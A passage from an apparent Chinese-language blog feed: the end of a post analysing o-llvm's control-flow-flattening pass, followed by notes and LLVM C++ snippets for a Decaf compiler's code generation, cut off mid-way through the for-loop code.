switchI-&gt;findCaseDest(succ);<br><br>  <span class="hljs-comment">// 如果没有找到后继基本块对应的 case 值，default </span><br>  <span class="hljs-keyword">if</span> (numCase == <span class="hljs-literal">NULL</span>) &#123;<br>    numCase = cast&lt;ConstantInt&gt;(<br>        ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),<br>                         llvm::cryptoutils-&gt;scramble32(<br>                             switchI-&gt;getNumCases() - <span class="hljs-number">1</span>, scrambling_key)));<span class="hljs-comment">// 获取 default 的 case 值</span><br>  &#125;<br>  <span class="hljs-comment">// 更新 switchVar 的值，变跳转到 loopEnd</span><br>  <span class="hljs-keyword">new</span> StoreInst(numCase, load-&gt;getPointerOperand(), i);<br>  BranchInst::Create(loopEnd, i); <span class="hljs-comment">// 跳转到loopEnd</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-有条件跳转结尾"><a href="#2-有条件跳转结尾" class="headerlink" title="2. 有条件跳转结尾"></a>2. 有条件跳转结尾</h4><p>对于一个条件跳转的基本块，一般两个后继。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// If it&#x27;s a conditional jump</span><br><span class="hljs-keyword">if</span> (i-&gt;getTerminator()-&gt;getNumSuccessors() == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-comment">// 分别获取两个后继的 case 值</span><br>    ConstantInt *numCaseTrue =<br>        switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(<span class="hljs-number">0</span>));<br>    ConstantInt *numCaseFalse =<br>        switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">// 后继是否为 default case</span><br>    <span class="hljs-keyword">if</span> (numCaseTrue == <span class="hljs-literal">NULL</span>) &#123;<br>        numCaseTrue = cast&lt;ConstantInt&gt;(<br>            ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),<br>                             llvm::cryptoutils-&gt;scramble32(<br>                                 switchI-&gt;getNumCases() - <span class="hljs-number">1</span>, scrambling_key)));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (numCaseFalse == <span class="hljs-literal">NULL</span>) &#123;<br>        numCaseFalse = cast&lt;ConstantInt&gt;(<br>            ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),<br>                             llvm::cryptoutils-&gt;scramble32(<br>                                 switchI-&gt;getNumCases() - <span class="hljs-number">1</span>, scrambling_key)));<br>    &#125;<br><br>    <span class="hljs-comment">// 创建 SelectInst</span><br>    BranchInst *br = cast&lt;BranchInst&gt;(i-&gt;getTerminator());<br>    SelectInst *sel =<br>        SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, <span class="hljs-string">&quot;&quot;</span>,<br>                           i-&gt;getTerminator());<br><br>    <span class="hljs-comment">// 删除 terminator （结尾跳转指令）</span><br>    i-&gt;getTerminator()-&gt;eraseFromParent();<br><br>    <span class="hljs-comment">// 更新 switchVar 的值，变跳转到 loopEnd</span><br>    <span class="hljs-keyword">new</span> StoreInst(sel, load-&gt;getPointerOperand(), i);<br>    BranchInst::Create(loopEnd, i);<br>    <span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-RET-指令结尾"><a href="#3-RET-指令结尾" class="headerlink" title="3. RET 指令结尾"></a>3. RET 指令结尾</h4><p>这个就比较简单了，RET 指令不需要重新回到 loop，所以不用做任何处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Ret BB</span><br><span class="hljs-keyword">if</span> (i-&gt;getTerminator()-&gt;getNumSuccessors() == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-修复-stack"><a href="#9-修复-stack" class="headerlink" title="9: 修复 stack"></a>9: 修复 stack</h3><p>o-llvm 控制流平坦化的最后一步是 <code>fixStack(Function *f)</code> 这一步是处理局部变量分配问题。</p><p>主要处理两类变量:</p><pre><code>1. PHI Node2. 非入口基本块中分配的局部变量</code></pre><p>对于 PHI Node，fixStack 直接简单的粗暴的调用 <code>DemotePHIToStack</code> 将 PHI Node 变量 Entry 中分配</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">DemotePHIToStack(tmpPhi.at(i), f-&gt;begin()-&gt;getTerminator());<br></code></pre></td></tr></table></figure><p>对于非 Entry 基本块中申请的局部变量，若该变量在其它基本块中还有使用的话，需要将该变量提到 Entry 中分配</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">DemoteRegToStack(*tmpReg.at(i), f-&gt;begin()-&gt;getTerminator());<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>o-llvm 控制流平坦化的原理非常简单，只是简单的将原始基本块插入到 switch 结构中，并删除原始基本块之间的跳转指令。然而实际案例中，为何还原 o-llvm 控制流平坦化如此困难？</p><p>要回答这个问题，我们首先来回到 <code>flatten</code> 的第一步，将 switch 转换成二分if。该过程主要是通过调用 llvm 里面的一个 FunctionPass 来实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Lower switch</span><br>FunctionPass *lower = createLowerSwitchPass();<br>lower-&gt;runOnFunction(*f);<br></code></pre></td></tr></table></figure><p><code>LowerSwitchPass</code> 将 switch 指令转换成等价的 if 实现，这极大的增加基本块的数量，当下一次对这个函数混淆的时候，将产生更多的 case。</p><p>重复对某个函数执行 <code>flatten</code> ，基本块的数量将越来越多，其中大量的基本块都是为实现二分 if 而存在，这使得识别原始基本块十分困难。</p><p>最后，flatten 执行完后，可能还有其它的优化 pass 对混淆过的函数进行处理，进一步打乱一些固定的特征模式。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html#writing-an-llvm-pass-basiccode">https://llvm.org/docs/WritingAnLLVMPass.html#writing-an-llvm-pass-basiccode</a></p><p><a href="https://osterlund.xyz/posts/2017-11-28-LLVM-pass.html">https://osterlund.xyz/posts/2017-11-28-LLVM-pass.html</a></p><p><a href="https://www.zhihu.com/question/49642237">https://www.zhihu.com/question/49642237</a></p>]]></content>
    
    
    <categories>
      
      <category>obfuscator</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obfuscator</tag>
      
      <tag>llvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Decaf codegen based on LLVM</title>
    <link href="/2021/03/04/Decaf-codegen-based-on-LLVM/"/>
    <url>/2021/03/04/Decaf-codegen-based-on-LLVM/</url>
    
    <content type="html"><![CDATA[<h1 id="Decaf-编译器代码生成"><a href="#Decaf-编译器代码生成" class="headerlink" title="Decaf 编译器代码生成"></a>Decaf 编译器代码生成</h1><p>记录一下使用 llvm api 实现 Decaf 编译器 codegen 过程中的代码片段以及一些基础语法结构实现过程。</p><h2 id="Int-与-Bool"><a href="#Int-与-Bool" class="headerlink" title="Int 与 Bool"></a>Int 与 Bool</h2><p>llvm 里面 Bool 类型其实也是一个 Integer，只不过长度为 1bit.<br>例如如下代码可以判断 xxxx 是否为 bool 变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (xxxx-&gt;getType()-&gt;isIntegerTy() &amp;&amp; xxxx-&gt;getType()-&gt;getIntegerBitWidth() == <span class="hljs-number">1</span>)<br>...<br></code></pre></td></tr></table></figure><h2 id="变量的定义与初始化"><a href="#变量的定义与初始化" class="headerlink" title="变量的定义与初始化"></a>变量的定义与初始化</h2><p>局部变量</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">llvm::Value<span class="hljs-operator"> * </span>variable = Builder.<span class="hljs-constructor">CreateAlloca(<span class="hljs-params">getLLVMType</span>(<span class="hljs-params">getType</span>()</span>), <span class="hljs-number">0</span>, get<span class="hljs-constructor">Name()</span>);<br></code></pre></td></tr></table></figure><p>全局变量</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-literal">new</span> llvm<span class="hljs-type">::GlobalVariable</span>(*TheModule, ty, <span class="hljs-literal">false</span>, <br>llvm<span class="hljs-type">::GlobalVariable</span><span class="hljs-type">::CommonLinkage</span>, decafGetInitalizer(ty), Name);<br></code></pre></td></tr></table></figure><p><code>CreateAlloca</code> 与 <code>GlobalVariable</code> 申请变量，返回的是变量的<code>指针</code>，处理这些变量时，需要用 <code>load</code> 和 <code>store</code> 来将这些变量的值载入或保存。 </p><p>注意，llvm 中函数的参数 <code>llvm::Argument</code>的类型是真实类型，不是一个指针，不能赋值（store），所以在最好在函数入口时将参数转存到局部变量。</p><h2 id="数组的定义与引用"><a href="#数组的定义与引用" class="headerlink" title="数组的定义与引用"></a>数组的定义与引用</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 定义一个全局数组</span><br>llvm::ArrayType * arrayType = llvm::ArrayType::get(ty, field_size-&gt;getArraySize());<br>llvm::Constant  *  initializer = llvm::ConstantAggregateZero::get(arrayType);<br>llvm::Value * arr = llvm::GlobalVariable(*TheModule, arrayType, <span class="hljs-literal">false</span>, llvm::GlobalVariable::CommonLinkage, initializer, Name);<br><br><span class="hljs-comment">// 引用数组</span><br>llvm::Value * lvalue = Builder.CreateGEP(arr, &#123;Builder.getInt32(<span class="hljs-number">0</span>), idx&#125;, <span class="hljs-string">&quot;arr&quot;</span>); <span class="hljs-comment">//idx&#x27;s type: llvm::Value *</span><br>Builder.CreateStore(Builder.getInt32(<span class="hljs-number">0</span>), lvalue); <span class="hljs-comment">// arr[idx] = 0</span><br><br></code></pre></td></tr></table></figure><p>CreateGEP 生成的是 getelementptr 指令，这个指令有两个 index，很容易让人误解。这是一个地址计算指令，它不仅能计算数组某元素的偏移，还可以计算结构体中某字段的偏移。</p><p>第一个 index 是传入的顶层指针作为数组的 index</p><p>第二个 index 是单个数据类型内部的偏移 index</p><p>例如下面这段代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-keyword">int</span> b;<br>&#125;<br><br>S * p = <span class="hljs-keyword">new</span> S();<br>p[<span class="hljs-number">0</span>].a = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>p 是一个指针，可以当作数组索引，该索引就是 index1；p 指向的结构体是一个 Struct，内部又可以索引（索引a或b字段），这就是第二个索引。</p><p>用 CreateGEP 计算数组中某个元素的地址，只需要将第一个索引设置为0，第二个索引设置为真实下标即可，也就是传入 {Builder.getInt32(0), idx}</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>llvm 中定义函数签名与定义函数代码的过程是分开的，所以函数签名定义后，并不需要立即实现，并且可以在链接阶段静态链接到其它的库。</p><p>声名函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">llvm::Value * <span class="hljs-title">codegen</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">// codegen for method declare</span><br>llvm::Type * returnTy;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;llvm::Type *&gt; args;<br><span class="hljs-built_in">list</span>&lt;decafAST *&gt; argumentList;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> t : argumentList) &#123; <span class="hljs-comment">// 这个阶段只需要指出函数参数的类型即可</span><br>args.push_back(getLLVMType(t-&gt;getType()));<br>&#125;<br>returnTy = getLLVMType(ReturnType-&gt;getType());<br>declare = llvm::Function::Create(<br>llvm::FunctionType::get(returnTy, args, <span class="hljs-literal">false</span>),<br>llvm::Function::ExternalLinkage,<br>Name,<br>TheModule);<br><span class="hljs-comment">// 给参数设置符号名</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">auto</span> arg_iter = argumentList.begin();<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp; arg : declare-&gt;args()) &#123;<br>VarDefAST * ty = (VarDefAST *) *arg_iter++;<br>arg.setName(ty-&gt;getName());<br>&#125;<br><br>symbol_enter(Name, SYM_FUNCTION, declare);<br><span class="hljs-keyword">return</span> declare;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成函数代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">llvm::Value * <span class="hljs-title">codegen_body</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// codegen for method body..</span><br>    llvm::BasicBlock * BB = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;entry&quot;</span>, declare);<br>    Builder.SetInsertPoint(BB);<br><br>    <span class="hljs-comment">// 将参数插入到符号表中</span><br>    scope_enter();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp; Arg : declare-&gt;args()) &#123;<br>        llvm::Value * va_arg = &amp;Arg;<br>        llvm::Value * alloc = Builder.CreateAlloca(va_arg-&gt;getType(), <span class="hljs-number">0</span>, va_arg-&gt;getName());<br>        Builder.CreateStore(va_arg, alloc);<br>        symbol_enter(Arg.getName().str(), SYM_VAR, alloc);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 生成函数块的代码</span><br>    Block-&gt;codegen();<br>    <br>    <span class="hljs-comment">// 检查函数基本块是否正常返回</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp; bb : declare-&gt;getBasicBlockList()) &#123;<br>        llvm::Instruction *Terminator = bb.getTerminator();<br>        <span class="hljs-keyword">if</span> (!Terminator) &#123;<br>            llvm::Type * ty = declare-&gt;getReturnType();<br>            Builder.SetInsertPoint(&amp;bb);<br>            <span class="hljs-keyword">if</span> (ty-&gt;isVoidTy())&#123;<br>                Builder.CreateRetVoid();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(ty-&gt;isIntegerTy()) &#123;<br>                <span class="hljs-keyword">if</span>(ty-&gt;getIntegerBitWidth() == <span class="hljs-number">1</span>)<br>                    Builder.CreateRet(Builder.getInt1(<span class="hljs-number">0</span>));<br>                <span class="hljs-keyword">else</span><br>                    Builder.CreateRet(Builder.getInt32(<span class="hljs-number">0</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    scope_leave();<br>    llvm::verifyFunction(*declare);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="布尔表达式短路"><a href="#布尔表达式短路" class="headerlink" title="布尔表达式短路"></a>布尔表达式短路</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">a <span class="hljs-meta">&amp;&amp; b</span><br></code></pre></td></tr></table></figure><p>若 a 为 false，则不执行 b，返回 a 的值，否则返回 b 的值。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">a <span class="hljs-string">|| b</span><br></code></pre></td></tr></table></figure><p>若 a 为 false，则执行 b，返回 b 的值，否则返回 a 的值。</p><p>这种实现需要手动插入基本块和 PHI 节点，如下为 &amp;&amp; 的实现代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::BasicBlock * bbori = Builder.GetInsertBlock();<br>llvm::Function   * func  = bbori-&gt;getParent();<br>llvm::BasicBlock * bb1   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;And1&quot;</span>, func);<br>llvm::BasicBlock * bb2   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;AndEnd&quot;</span>, func);<br>llvm::BasicBlock * bbcur = <span class="hljs-literal">nullptr</span>;<br>Builder.CreateCondBr(value1, bb1, bb2);<br>Builder.SetInsertPoint(bb1);<br>value2 = RightExpr-&gt;codegen();<br>bbcur  = Builder.GetInsertBlock(); <span class="hljs-comment">// The RHS may create new BBs. </span><br>Builder.CreateBr(bb2);<br>Builder.SetInsertPoint(bb2);<br><br>llvm::PHINode * node = Builder.CreatePHI(getLLVMType(boolTy), <span class="hljs-number">2</span>, <span class="hljs-string">&quot;phiAnd&quot;</span>);<br>node-&gt;addIncoming(value1, bbori);   <span class="hljs-comment">// from original bb.</span><br>node-&gt;addIncoming(value2, bbcur);   <span class="hljs-comment">// from and 2 bb.</span><br><span class="hljs-keyword">return</span> node;<br></code></pre></td></tr></table></figure><p>如下为 || 的实现代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::BasicBlock * bbori = Builder.GetInsertBlock();<br>llvm::Function   * func  = bbori-&gt;getParent();<br>llvm::BasicBlock * bb1   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;Or1&quot;</span>, func);<br>llvm::BasicBlock * bb2   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;OrEnd&quot;</span>, func);<br>llvm::BasicBlock * bbcur = <span class="hljs-literal">nullptr</span>;<br><br>Builder.CreateCondBr(value1, bb2, bb1);<br>Builder.SetInsertPoint(bb1);<br>value2 = RightExpr-&gt;codegen();<br>bbcur  = Builder.GetInsertBlock(); <span class="hljs-comment">// The RHS may create new BBs. </span><br>Builder.CreateBr(bb2);<br>Builder.SetInsertPoint(bb2);<br><br>llvm::PHINode * node = Builder.CreatePHI(getLLVMType(boolTy), <span class="hljs-number">2</span>, <span class="hljs-string">&quot;phiOR&quot;</span>);<br>node-&gt;addIncoming(value1, bbori); <span class="hljs-comment">// from original bb.</span><br>node-&gt;addIncoming(value2, bbcur); <span class="hljs-comment">// from and 2 bb.</span><br><br><span class="hljs-keyword">return</span> node;<br></code></pre></td></tr></table></figure><p>调试过程中发现一个问题，即 a &amp;&amp; b || c 这样的表达式会出现问题，这是因为先计算 a，创建新的BB（bb1） 来放计算 b || c 的代码，而 b || c 又会创建新的BB，addIncoming( , bb1) 这样写就会出问题，因为当前Basic Block 已经不是 bb1 。所以，我在生成 <code>&amp;&amp;</code> /<code> ||</code>运算符右侧表达式后重新获取当前 BB 。</p><h2 id="If-语句"><a href="#If-语句" class="headerlink" title="If 语句"></a>If 语句</h2><p>If 语句的实现要创建3个基本块，<code>ifTrue</code>, <code>ifFalse</code>, <code>ifCont</code> 。 <code>ifCont</code> 就是其余两个基本块的交汇基本块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">llvm::Value * <span class="hljs-title">codegen</span><span class="hljs-params">()</span> </span>&#123;<br>    llvm::Value      * cond = ConditionExpr-&gt;codegen();<br>    llvm::BasicBlock * BBoriginal = Builder.GetInsertBlock();<br>    llvm::Function   * func    = BBoriginal-&gt;getParent();<br>    llvm::BasicBlock * BBTrue  = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;IfTrue&quot;</span>, func);<br>    llvm::BasicBlock * BBFalse = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;IfFalse&quot;</span>, func);<br>    llvm::BasicBlock * BBCont  = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;IfCont&quot;</span>, func);<br>    Builder.CreateCondBr(cond, BBTrue, BBFalse);<br>    Builder.SetInsertPoint(BBTrue);<br>    IfBlock-&gt;codegen();<br>    <br>    <span class="hljs-comment">// 检查基本块是否有 ret 指令，如果没有才创建 br 跳转到交汇基本块；如果有 ret，则 br 是 unreachable ，没有意义，而且还会导致 llvm 变量序号计算出错.</span><br>    <span class="hljs-keyword">if</span>(!Builder.GetInsertBlock()-&gt;getTerminator())<br>        Builder.CreateBr(BBCont);<br><br>    Builder.SetInsertPoint(BBFalse);<br>    <span class="hljs-keyword">if</span> (ElseBlock) ElseBlock-&gt;codegen();<br><br>    <span class="hljs-comment">// 同上</span><br>    <span class="hljs-keyword">if</span>(!Builder.GetInsertBlock()-&gt;getTerminator())<br>        Builder.CreateBr(BBCont);<br><br>    Builder.SetInsertPoint(BBCont);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="while-语句"><a href="#while-语句" class="headerlink" title="while 语句"></a>while 语句</h2><p>for/while，有两种语法很蛋疼，分别是 <code>break</code> 和 <code>continue</code></p><p>为了实现这两种语法的功能，我们需要将循环开始（条件判断）、循环结束的基本块都添加到符号表中，方便索引。要实现嵌套循环，在 while/for 循环代码生成阶段，我不得不在符号表中创建一个新的 scope。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">llvm::Value * <span class="hljs-title">codegen</span><span class="hljs-params">()</span> </span>&#123;<br>llvm::BasicBlock * BBori = Builder.GetInsertBlock();<br>llvm::Function   * func = BBori-&gt;getParent();<br>llvm::BasicBlock * BBwhileStart = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;whileStart&quot;</span>, func); <span class="hljs-comment">// Create a BB for &#x27;continue&#x27;</span><br>llvm::BasicBlock * BBwhileBody  = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;whileBody&quot;</span> , func);<br>llvm::BasicBlock * BBwhileEnd   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;whileEnd&quot;</span>  , func);<br><br>    scope_enter(); <span class="hljs-comment">// 创建新的 scope</span><br>symbol_enter(<span class="hljs-string">&quot;LoopStart&quot;</span>, SYM_BB, BBwhileStart);  <span class="hljs-comment">//  continue;</span><br>symbol_enter(<span class="hljs-string">&quot;LoopEnd&quot;</span>,   SYM_BB, BBwhileEnd); <span class="hljs-comment">// break;</span><br>    Builder.CreateBr(BBwhileStart); <br>    <span class="hljs-comment">// step 1 条件验证</span><br>Builder.SetInsertPoint(BBwhileStart); <span class="hljs-comment">//BBori -&gt; BBwhileStart</span><br>llvm::Value * cond = ConditionExpr-&gt;codegen();<br>Builder.CreateCondBr(cond, BBwhileBody, BBwhileEnd);<br>    <br>    <span class="hljs-comment">// step 2 循环体代码生成</span><br>Builder.SetInsertPoint(BBwhileBody);<br>WhileBlock-&gt;codegen();<br>Builder.CreateBr(BBwhileStart);<br>Builder.SetInsertPoint(BBwhileEnd); <br>scope_leave(); <span class="hljs-comment">// 退出当前 scope，当前循环的 LoopStart 和 LoopEnd 符号删除..</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><p>for 循环稍微麻烦一点，大致可以分为 4 个阶段</p><p>第一个阶段，初始化变量</p><p>第二个阶段，循环条件验证</p><p>第三个阶段，循环体代码生成</p><p>第四个阶段，自增代码生成</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">llvm::Value * <span class="hljs-title">codegen</span><span class="hljs-params">()</span> </span>&#123;<br>    llvm::Function * func = Builder.GetInsertBlock()-&gt;getParent();<br>    llvm::BasicBlock * BBForCond = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;BBForCond&quot;</span>, func);<br>    llvm::BasicBlock * BBForLA   = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;BBForLA&quot;</span>, func);<br>    llvm::BasicBlock * BBForBody = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;BBForBody&quot;</span>, func);<br>    llvm::BasicBlock * BBForEnd  = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;BBForEnd&quot;</span>, func);<br>    <br>    scope_enter();<br>    symbol_enter(<span 